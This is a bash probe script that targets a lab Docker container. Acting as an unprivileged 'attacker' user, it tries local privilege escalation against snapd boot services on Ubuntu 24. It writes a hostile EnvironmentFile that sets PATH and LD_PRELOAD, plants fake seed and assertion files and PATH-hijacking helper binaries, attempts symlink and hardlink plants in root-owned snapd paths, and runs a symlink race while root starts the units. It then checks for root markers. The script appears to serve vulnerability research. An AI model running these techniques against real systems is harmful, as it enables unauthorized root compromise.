#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/snapd-boot-services.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

echo "snapd boot/default service LPE probe"
echo "target=$TARGET"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

docker exec -i "$TARGET" bash <<'TARGET_SCRIPT'
set -Eeuo pipefail
export LC_ALL=C

ATTACKER=attacker
BASE=/tmp/snapd-boot-services-probe
ROOT_MARKER=/root/snapd_boot_services_root_marker
TMP_MARKER=/tmp/snapd_boot_services_tmp_marker
VAR_TMP_MARKER=/var/tmp/snapd_boot_services_var_tmp_marker
HELPER_HITS=$BASE/helper-hit.log
RUN_EPOCH="$(date +%s)"

UNITS=(
  snapd.core-fixup.service
  snapd.recovery-chooser-trigger.service
  snapd.snap-repair.service
  snapd.snap-repair.timer
  snapd.apparmor.service
  snapd.failure.service
  snapd.autoimport.service
  snapd.system-shutdown.service
  snapd.seeded.service
)

INPUT_PATHS=(
  /etc/environment
  /var/lib/snapd/environment
  /var/lib/snapd/environment/snapd.conf
  /var/lib/snapd/seed
  /var/lib/snapd/seed/seed.yaml
  /var/lib/snapd/seed/assertions
  /var/lib/snapd/seed/assertions/sbs.assert
  /var/lib/snapd/seed/snaps
  /var/lib/snapd/seed/snaps/sbs_1.snap
  /var/lib/snapd/assertions
  /var/lib/snapd/assertions/asserts-v0
  /var/cache/snapd
  /var/cache/snapd/assertions
  /var/cache/snapd/snaps
  /var/lib/snapd/snaps
  /var/lib/snapd/snaps/partial
  /var/lib/snapd/auto-import
  /var/lib/snapd/auto-import/sbs.assert
  /var/lib/snapd/apparmor
  /var/lib/snapd/apparmor/profiles
  /var/cache/apparmor
  /run/mnt
  /run/mnt/ubuntu-seed
  /run/mnt/ubuntu-seed/seed.yaml
  /dev/input
  /dev/input/event0
  /boot/uboot
  /boot/uboot/uboot.env
  /etc/cloud
  /var/lib/cloud
  /writable/system-data
  /tmp
  /var/tmp
)

section() {
  printf '\n## %s\n' "$1"
}

run() {
  local label="$1"
  shift
  section "$label"
  printf '$'
  printf ' %q' "$@"
  printf '\n'
  set +e
  "$@" 2>&1
  local rc=$?
  set -e
  printf 'rc=%s\n' "$rc"
}

run_sh() {
  local label="$1"
  local script="$2"
  section "$label"
  printf '$ bash -lc %q\n' "$script"
  set +e
  bash -lc "$script" 2>&1
  local rc=$?
  set -e
  printf 'rc=%s\n' "$rc"
}

run_attacker() {
  local label="$1"
  local script="$2"
  section "$label"
  printf '$ runuser -u %q -- bash -lc %q\n' "$ATTACKER" "$script"
  set +e
  runuser -u "$ATTACKER" -- env BASE="$BASE" ROOT_MARKER="$ROOT_MARKER" TMP_MARKER="$TMP_MARKER" \
    VAR_TMP_MARKER="$VAR_TMP_MARKER" HELPER_HITS="$HELPER_HITS" bash -lc "$script" 2>&1
  local rc=$?
  set -e
  printf 'rc=%s\n' "$rc"
}

unit_prop_dump() {
  local unit="$1"
  section "unit state: $unit"
  systemctl status --no-pager -l "$unit" 2>&1 | sed -n '1,90p' || true
  printf '\n[show]\n'
  systemctl show "$unit" --no-pager \
    -p Id -p FragmentPath -p UnitFileState -p UnitFilePreset -p LoadState \
    -p ActiveState -p SubState -p Result -p ConditionResult -p AssertResult \
    -p Triggers -p TriggeredBy -p Requires -p Wants -p After -p Before \
    -p ExecStart -p ExecStartPre -p ExecStartPost -p EnvironmentFiles -p Environment \
    -p RemainAfterExit 2>&1 | sed -n '1,120p' || true
}

marker_check() {
  section "$1"
  local found=0
  for f in "$ROOT_MARKER" "$TMP_MARKER" "$VAR_TMP_MARKER" "$HELPER_HITS"; do
    if [ -e "$f" ]; then
      found=1
      echo "FOUND $f"
      stat -c '%A %a %U:%G %u:%g %s %n' "$f" 2>&1 || true
      sed -n '1,80p' "$f" 2>&1 || true
    else
      echo "MISSING $f"
    fi
  done
  if [ "$found" -eq 0 ]; then
    echo "ROOT_PROOF=NO"
  else
    echo "ROOT_PROOF=CANDIDATE"
  fi
}

cleanup_probe_system_path() {
  local p="$1"
  if [ -L "$p" ]; then
    local target
    target="$(readlink -- "$p" 2>/dev/null || true)"
    if [[ "$target" == "$BASE"* ]]; then
      rm -f -- "$p" || true
    fi
  elif [ -f "$p" ]; then
    if grep -aq 'snapd_boot_services_probe' "$p" 2>/dev/null; then
      rm -f -- "$p" || true
    fi
  fi
}

cleanup() {
  set +e
  cleanup_probe_system_path /var/lib/snapd/environment/snapd.conf
  cleanup_probe_system_path /var/lib/snapd/seed/seed.yaml
  cleanup_probe_system_path /var/lib/snapd/seed/assertions/sbs.assert
  cleanup_probe_system_path /var/lib/snapd/seed/snaps/sbs_1.snap
  cleanup_probe_system_path /var/cache/snapd/assertions/sbs.assert
  cleanup_probe_system_path /var/cache/snapd/snaps/sbs_1.snap
  cleanup_probe_system_path /var/lib/snapd/snaps/sbs_1.snap
  cleanup_probe_system_path /var/lib/snapd/auto-import/sbs.assert
  cleanup_probe_system_path /run/mnt/ubuntu-seed
  cleanup_probe_system_path /run/mnt/ubuntu-seed/seed.yaml
  rm -f "$ROOT_MARKER" "$TMP_MARKER" "$VAR_TMP_MARKER"
  rm -rf "$BASE"
  systemctl reset-failed "${UNITS[@]}" >/dev/null 2>&1 || true
}

trap cleanup EXIT

section "pre-clean"
cleanup

section "target identity, default packages, versions"
sed -n '1,14p' /etc/os-release
uname -a
cat /proc/cmdline
id
id "$ATTACKER"
systemctl --version | sed -n '1,4p'
dpkg-query -W -f='${binary:Package}\t${Version}\t${Architecture}\n' \
  snapd apparmor systemd systemd-sysv squashfs-tools finalrd policykit-1 polkitd dbus curl 2>&1 | sort || true
dpkg-query -S /usr/bin/finalrd 2>&1 || true
snap version 2>&1 || true
snap list --all 2>&1 || true
snap debug state /var/lib/snapd/state.json 2>&1 | sed -n '1,80p' || true
snap debug seeding 2>&1 || true

section "default unit enabled, active, and failed state"
systemctl is-system-running 2>&1 || true
systemctl list-unit-files "${UNITS[@]}" snapd.service snapd.socket --no-pager 2>&1 || true
printf '\n[is-enabled]\n'
systemctl is-enabled "${UNITS[@]}" snapd.service snapd.socket 2>&1 || true
printf '\n[is-active]\n'
systemctl is-active "${UNITS[@]}" snapd.service snapd.socket 2>&1 || true
printf '\n[is-failed]\n'
systemctl is-failed "${UNITS[@]}" snapd.service snapd.socket 2>&1 || true
for u in "${UNITS[@]}" snapd.service snapd.socket; do
  unit_prop_dump "$u"
done

section "systemctl cat for scoped units"
for u in "${UNITS[@]}" snapd.service snapd.socket; do
  printf '\n### %s\n' "$u"
  systemctl cat "$u" 2>&1 | sed -n '1,180p' || true
done

section "condition evaluation on this stock classic container"
for c in \
  'ConditionKernelCommandLine=|snap_core' \
  'ConditionKernelCommandLine=|snapd_recovery_mode' \
  'ConditionKernelCommandLine=snapd_recovery_mode' \
  'ConditionPathExistsGlob=/dev/input/event*' \
  'ConditionSecurity=apparmor' \
  'ConditionPathExists=/usr/lib/snapd/system-shutdown' \
  'ConditionPathExists=!/usr/bin/finalrd'; do
  printf '\n### %s\n' "$c"
  systemd-analyze condition "$c" 2>&1 || true
done

section "installed helper files and relevant source/literal lines"
dpkg -L snapd | grep -E '(snapd\.(core-fixup|recovery|snap-repair|apparmor|failure|autoimport|system-shutdown|seeded)|snap-repair|auto-import|recovery|core-fixup|apparmor|system-shutdown)' | sort || true
stat -c '%A %a %U:%G %u:%g %s %n' \
  /usr/lib/snapd/snapd.core-fixup.sh \
  /usr/lib/snapd/snap-bootstrap \
  /usr/lib/snapd/snap-repair \
  /usr/lib/snapd/snapd-apparmor \
  /usr/lib/snapd/snap-failure \
  /usr/lib/snapd/system-shutdown \
  /usr/lib/snapd/snap-preseed \
  /usr/bin/snap 2>&1 || true
file /usr/lib/snapd/snapd.core-fixup.sh /usr/lib/snapd/snap-bootstrap /usr/lib/snapd/snap-repair \
  /usr/lib/snapd/snapd-apparmor /usr/lib/snapd/snap-failure /usr/lib/snapd/system-shutdown \
  /usr/lib/snapd/snap-preseed /usr/bin/snap 2>&1 || true
getcap -v /usr/lib/snapd/snapd.core-fixup.sh /usr/lib/snapd/snap-bootstrap /usr/lib/snapd/snap-repair \
  /usr/lib/snapd/snapd-apparmor /usr/lib/snapd/snap-failure /usr/lib/snapd/system-shutdown \
  /usr/lib/snapd/snap-preseed /usr/bin/snap 2>&1 || true
printf '\n[snapd.core-fixup.sh]\n'
nl -ba /usr/lib/snapd/snapd.core-fixup.sh | sed -n '1,140p'
printf '\n[compiled helper path/assertion/seed literals]\n'
for b in /usr/lib/snapd/snap-bootstrap /usr/lib/snapd/snap-repair /usr/lib/snapd/snapd-apparmor /usr/lib/snapd/snap-failure /usr/lib/snapd/system-shutdown /usr/bin/snap /usr/lib/snapd/snap-preseed; do
  echo "### $b"
  grep -aEo '(ubuntu-seed|seed\.yaml|repair\.json|assertions|auto-import|snapd\.conf|/var/lib/snapd/[A-Za-z0-9_./:@+-]*|/run/mnt/ubuntu-seed[A-Za-z0-9_./:@+-]*|/var/cache/snapd[A-Za-z0-9_./:@+-]*|/var/cache/apparmor[A-Za-z0-9_./:@+-]*|/tmp[A-Za-z0-9_./:@+-]*|/var/tmp[A-Za-z0-9_./:@+-]*|/dev/input[A-Za-z0-9_./:@+-]*)' "$b" 2>/dev/null \
    | sort -u | sed -n '1,120p' || true
done

section "root-owned snapd unit input path inventory"
for p in "${INPUT_PATHS[@]}"; do
  printf '\n### %s\n' "$p"
  stat -c 'lstat: %A %a %U:%G %u:%g %F %s %n -> %N' "$p" 2>&1 || true
  stat -Lc 'stat:  %A %a %U:%G %u:%g %F %s %n' "$p" 2>&1 || true
  namei -l "$p" 2>&1 | sed -n '1,20p' || true
done
printf '\n[var/lib, cache, run snapd trees]\n'
find /var/lib/snapd /var/cache/snapd /run/snapd /var/cache/apparmor -maxdepth 3 -xdev \
  -printf '%M %u:%g %p -> %l\n' 2>&1 | sort | sed -n '1,260p' || true

section "attacker writable search in snapd-adjacent trees"
run_attacker "find writable snapd-adjacent paths" '
for d in /var/lib/snapd /var/cache/snapd /run/snapd /var/cache/apparmor /run/mnt /dev/input /tmp /var/tmp; do
  [ -e "$d" ] || { echo "MISSING $d"; continue; }
  echo "### $d"
  find "$d" -maxdepth 3 -xdev -writable -printf "%M %u:%g %p\n" 2>/dev/null | sort | sed -n "1,80p"
done'

section "prepare attacker-controlled seed, environment, autoimport, recovery, and helper payloads"
run_attacker "create hostile state under attacker-writable /tmp and /var/tmp" '
set -e
rm -rf "$BASE"
mkdir -p "$BASE"/{pathbin,fake-seed/assertions,fake-seed/snaps,ubuntu-seed/systems/20260516,recovery,preseed-image/var/lib/snapd/seed/assertions,preseed-image/var/lib/snapd/seed/snaps}
cat > "$BASE/evil-snapd.conf" <<EOF
# snapd_boot_services_probe hostile EnvironmentFile candidate
PATH=$BASE/pathbin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TMPDIR=$BASE/tmp
LD_PRELOAD=$BASE/not-real-preload.so
SNAPD_DEBUG=1
SNAP_REPAIR_FROM_TIMER=1
EOF
mkdir -p "$BASE/tmp"
cat > "$BASE/fake-seed/seed.yaml" <<EOF
snaps:
  - name: sbs
    file: sbs_1.snap
    unasserted: true
EOF
printf "snapd_boot_services_probe fake assertion\n" > "$BASE/fake-seed/assertions/sbs.assert"
printf "not a real snap\nsnapd_boot_services_probe\n" > "$BASE/fake-seed/snaps/sbs_1.snap"
cp "$BASE/fake-seed/seed.yaml" "$BASE/preseed-image/var/lib/snapd/seed/seed.yaml"
cp "$BASE/fake-seed/assertions/sbs.assert" "$BASE/preseed-image/var/lib/snapd/seed/assertions/sbs.assert"
cp "$BASE/fake-seed/snaps/sbs_1.snap" "$BASE/preseed-image/var/lib/snapd/seed/snaps/sbs_1.snap"
printf "snapd_boot_services_probe auto-import assertion\n" > "$BASE/auto-import.assert"
printf "snapd_boot_services_probe recovery chooser trigger\n" > "$BASE/recovery/trigger"
cp -a "$BASE/fake-seed/." "$BASE/ubuntu-seed/"
for h in snap snap-repair snapd-apparmor snap-failure snap-bootstrap snap-preseed apparmor_parser mount mkdir cp sh; do
  cat > "$BASE/pathbin/$h" <<EOS
#!/bin/sh
{
  echo "HELPER_HIT name=$h"
  date -u +%Y-%m-%dT%H:%M:%SZ
  id
  echo "args=\$*"
  echo "PATH=\$PATH"
  echo "TMPDIR=\${TMPDIR-}"
} >> "$HELPER_HITS"
{
  echo "root marker from $h"
  id
} > "$ROOT_MARKER" 2>/dev/null || true
echo "tmp marker from $h" > "$TMP_MARKER" 2>/dev/null || true
echo "var tmp marker from $h" > "$VAR_TMP_MARKER" 2>/dev/null || true
exit 23
EOS
  chmod 0755 "$BASE/pathbin/$h"
done
ln -s "$BASE/fake-seed" "$BASE/seed-link"
ln -s "$BASE/ubuntu-seed" "$BASE/ubuntu-seed-link"
ln -s "$BASE/evil-snapd.conf" "$BASE/snapd.conf-link"
find "$BASE" -maxdepth 4 -printf "%M %u:%g %p -> %l\n" | sort | sed -n "1,220p"
'

section "uid1001 direct writability, symlink, hardlink, and preseed attempts"
run_attacker "write/symlink/hardlink attempts against each input path" '
set +e
try_one() {
  p="$1"
  parent="$(dirname -- "$p")"
  base="$(basename -- "$p")"
  echo "### target=$p"
  if [ -d "$p" ]; then
    touch "$p/sbs_uid1001_touch" 2>&1
    echo "touch_dir_rc=$?"
    rm -f "$p/sbs_uid1001_touch" 2>/dev/null
    ln -s "$BASE/evil-snapd.conf" "$p/sbs_uid1001_link" 2>&1
    echo "symlink_dir_rc=$?"
    rm -f "$p/sbs_uid1001_link" 2>/dev/null
    ln "$BASE/evil-snapd.conf" "$p/sbs_uid1001_hardlink" 2>&1
    echo "hardlink_dir_rc=$?"
    rm -f "$p/sbs_uid1001_hardlink" 2>/dev/null
  else
    touch "$p" 2>&1
    echo "touch_file_rc=$?"
    rm -f "$p" 2>/dev/null
    ln -s "$BASE/evil-snapd.conf" "$p" 2>&1
    echo "symlink_file_rc=$?"
    rm -f "$p" 2>/dev/null
  fi
  ln /usr/lib/snapd/snapd.core-fixup.sh "$parent/sbs_core_fixup_hardlink_$base" 2>&1
  echo "hardlink_root_file_in_parent_rc=$?"
  rm -f "$parent/sbs_core_fixup_hardlink_$base" 2>/dev/null
}
for p in \
  /var/lib/snapd/environment/snapd.conf \
  /var/lib/snapd/seed \
  /var/lib/snapd/seed/seed.yaml \
  /var/lib/snapd/seed/assertions \
  /var/lib/snapd/seed/snaps \
  /var/lib/snapd/assertions/asserts-v0 \
  /var/cache/snapd/assertions \
  /var/cache/snapd/snaps \
  /var/lib/snapd/snaps \
  /var/lib/snapd/snaps/partial \
  /var/lib/snapd/auto-import \
  /var/lib/snapd/auto-import/sbs.assert \
  /var/lib/snapd/apparmor/profiles \
  /var/cache/apparmor \
  /run/mnt \
  /run/mnt/ubuntu-seed \
  /dev/input \
  /dev/input/event0 \
  /boot/uboot/uboot.env \
  /etc/cloud \
  /var/lib/cloud \
  /writable/system-data \
  /tmp \
  /var/tmp; do
  try_one "$p"
done
echo "### protected hardlink controls"
cat /proc/sys/fs/protected_hardlinks 2>/dev/null || true
ln /usr/lib/snapd/snap-repair "$BASE/root-owned-hardlink-test" 2>&1
echo "hardlink_root_owned_to_tmp_rc=$?"
ln "$BASE/evil-snapd.conf" /tmp/sbs_attacker_hardlink_tmp 2>&1
echo "hardlink_attacker_file_to_tmp_rc=$?"
rm -f /tmp/sbs_attacker_hardlink_tmp "$BASE/root-owned-hardlink-test" 2>/dev/null
'

run_attacker "snap-preseed fake image as uid1001" '
timeout 20s /usr/lib/snapd/snap-preseed "$BASE/preseed-image" 2>&1 | sed -n "1,160p"
echo "snap_preseed_rc=${PIPESTATUS[0]}"
find "$BASE/preseed-image" -maxdepth 5 -printf "%M %u:%g %p -> %l\n" | sort | sed -n "1,160p"
'

run_attacker "direct helper and snap command trigger attempts as uid1001" '
set +e
for cmd in \
  "systemctl start snapd.core-fixup.service" \
  "systemctl start snapd.recovery-chooser-trigger.service" \
  "systemctl start snapd.snap-repair.service" \
  "systemctl start snapd.snap-repair.timer" \
  "systemctl start snapd.apparmor.service" \
  "systemctl start snapd.failure.service" \
  "systemctl start snapd.autoimport.service" \
  "systemctl start snapd.system-shutdown.service" \
  "systemctl restart snapd.seeded.service" \
  "snap wait system seed.loaded" \
  "snap debug seeding" \
  "snap repairs" \
  "snap repair 1" \
  "snap auto-import" \
  "/usr/lib/snapd/snap-repair run" \
  "/usr/lib/snapd/snapd-apparmor start" \
  "/usr/lib/snapd/snap-failure snapd" \
  "/usr/lib/snapd/snap-bootstrap recovery-chooser-trigger" \
  "/usr/lib/snapd/system-shutdown"; do
  echo "### $cmd"
  timeout 15s bash -lc "$cmd" 2>&1 | sed -n "1,80p"
  echo "cmd_rc=${PIPESTATUS[0]}"
done
'

marker_check "markers after unprivileged attempts"

section "bounded race attempts while root starts scoped units"
run_sh "attacker symlink race against root-owned snapd inputs during root starts" '
set -e
rm -f /tmp/sbs-race.out
runuser -u attacker -- env BASE="'"$BASE"'" bash -lc '"'"'
success=0
fail=0
end=$((SECONDS+5))
targets="/var/lib/snapd/environment/snapd.conf /var/lib/snapd/seed/seed.yaml /var/lib/snapd/seed/assertions/sbs.assert /var/lib/snapd/seed/snaps/sbs_1.snap /var/cache/snapd/assertions/sbs.assert /var/cache/snapd/snaps/sbs_1.snap /var/lib/snapd/auto-import/sbs.assert /run/mnt/ubuntu-seed"
while [ "$SECONDS" -lt "$end" ]; do
  for t in $targets; do
    ln -s "$BASE/evil-snapd.conf" "$t" >/dev/null 2>&1 && success=$((success+1)) || fail=$((fail+1))
    rm -f "$t" >/dev/null 2>&1 || true
  done
done
echo "race_success=$success race_fail=$fail"
'"'"' > /tmp/sbs-race.out 2>&1 &
race_pid=$!
for u in snapd.core-fixup.service snapd.recovery-chooser-trigger.service snapd.snap-repair.service snapd.snap-repair.timer snapd.apparmor.service snapd.failure.service snapd.autoimport.service snapd.system-shutdown.service snapd.seeded.service; do
  echo "### root start $u"
  timeout 25s systemctl start "$u" 2>&1 | sed -n "1,80p" || true
  systemctl show "$u" -p ActiveState -p SubState -p Result -p ConditionResult --no-pager 2>&1 || true
done
wait "$race_pid" || true
cat /tmp/sbs-race.out 2>&1 || true
rm -f /tmp/sbs-race.out
'

marker_check "markers after root service starts"

section "post-start unit statuses and journals since probe start"
for u in "${UNITS[@]}"; do
  unit_prop_dump "$u"
done
for u in "${UNITS[@]}"; do
  printf '\n### journal %s\n' "$u"
  journalctl -u "$u" --since "@$RUN_EPOCH" --no-pager -o short-iso 2>&1 | sed -n '1,120p' || true
done

section "snapd seeded/service interaction checks after hostile state"
snap list --all 2>&1 || true
snap debug state /var/lib/snapd/state.json 2>&1 | sed -n '1,120p' || true
snap debug seeding 2>&1 || true
systemctl status --no-pager -l snapd.seeded.service snapd.service snapd.socket 2>&1 | sed -n '1,180p' || true

section "pre-cleanup final proof verdict"
if [ -e "$ROOT_MARKER" ] || [ -e "$TMP_MARKER" ] || [ -e "$VAR_TMP_MARKER" ] || [ -e "$HELPER_HITS" ]; then
  echo "FINAL_ROOT_PROOF=CANDIDATE"
else
  echo "FINAL_ROOT_PROOF=NO"
fi

section "cleanup"
cleanup
ls -ld "$BASE" "$ROOT_MARKER" "$TMP_MARKER" "$VAR_TMP_MARKER" 2>&1 || true
for p in /var/lib/snapd/environment/snapd.conf /var/lib/snapd/seed/seed.yaml /var/lib/snapd/auto-import/sbs.assert /run/mnt/ubuntu-seed; do
  stat -c '%A %a %U:%G %F %n -> %N' "$p" 2>&1 || true
done

section "final health after cleanup"
systemctl is-system-running 2>&1 || true
systemctl --failed --no-pager 2>&1 || true
systemctl is-active snapd.socket snapd.service snapd.seeded.service 2>&1 || true
snap list --all 2>&1 || true
TARGET_SCRIPT
